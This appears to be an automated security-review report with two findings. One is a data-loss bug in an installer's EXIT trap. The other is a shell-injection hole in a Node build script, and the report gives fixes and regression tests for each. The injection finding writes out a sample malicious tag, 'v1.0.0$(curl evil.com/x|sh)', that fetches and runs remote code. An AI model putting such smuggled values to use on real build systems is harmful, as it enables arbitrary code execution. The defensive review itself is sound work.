## high: EXIT trap deletes preserved state files if install fails mid-swap

id: fnd_sig-feat-config-cf96aef71d-dc789_bafbc5975a
category: data-loss
confidence: high
triage: confirmed-bug
status: open
feature: Shell/workflow config install.sh (feat_config_cf96aef71d)

evidence:
- scripts/install.sh:125
- scripts/install.sh:148-158

PRESERVE_DIR is created inside TMP_DIR (line 148). The EXIT trap (line 125) unconditionally removes TMP_DIR. If the script fails between 'rm -rf $INSTALL_DIR' (line 158) and successful tar extraction (line 160)—e.g., disk full, tar corruption, or set -e triggered by mkdir failure—bash exits, the trap fires, and PRESERVE_DIR containing the user's .env and prism.db is permanently deleted alongside the already-removed INSTALL_DIR. The user loses both their running install and their backed-up state in one failure.

recommendation:
Place PRESERVE_DIR outside TMP_DIR (e.g., a sibling mktemp directory) and give it its own trap that restores files to INSTALL_DIR on failure, or restructure the swap to extract into a staging directory and only move the old INSTALL_DIR aside after the new extraction succeeds (rename-based atomic swap).

test analysis:
No tests are included for this feature; the failure requires simulating a mid-install abort after INSTALL_DIR removal but before tar extraction completes.

suggested regression test:
Shell test: create a fake INSTALL_DIR with .env and prism.db, stub tar to exit 1, run install.sh, assert the .env and prism.db still exist on disk after the script exits non-zero.

minimum fix scope:
Move PRESERVE_DIR to a separate mktemp -d outside TMP_DIR; update the EXIT trap to restore preserved files into INSTALL_DIR if the script exits non-zero before restoration completes.

repro:
Fill the target filesystem to capacity after the checksum passes, then run the installer over an existing install that has a .env and prism.db. mkdir -p or tar -xzf fails, set -e exits, the EXIT trap removes TMP_DIR (including PRESERVE_DIR), and the original INSTALL_DIR was already deleted on line 158.

confidence: high
triage: confirmed-bug
status: open
feature: Node source scripts (feat_library_710c9f5545)

evidence:
- scripts/build-bundle.ts:33 (version)
- scripts/build-bundle.ts:62-68

The VERSION environment variable (line 33) is interpolated into tarballName (line 62) which is then passed to execSync as a shell string (line 66). execSync spawns a shell, so any shell metacharacters in VERSION (semicolons, backticks, $(), pipes) will be interpreted. In CI, VERSION is typically derived from a git tag (per the comment on lines 31-32). A malicious or compromised git tag like v1.0.0$(curl evil.com/x|sh) would achieve arbitrary command execution during the build. recommendation:
Replace execSync string interpolation with execFileSync('tar', ['-czf', tarballName, '-C', stageDir, 'dist', 'lib'], { cwd: repoRoot, stdio: 'inherit' }) to avoid shell interpretation. Alternatively, validate VERSION against a strict semver regex before use.

test analysis:
No tests are included for this feature, and build scripts are typically not unit-tested. The injection requires a crafted VERSION value that would not appear in normal CI runs.

suggested regression test:
Add a unit test or integration check that calls the tar logic with VERSION containing shell metacharacters (e.g., '1.0.0;echo pwned') and asserts no extra file is created / the command fails safely.

minimum fix scope:
Replace execSync on line 65-68 with execFileSync using an argument array, eliminating the shell entirely.

repro:
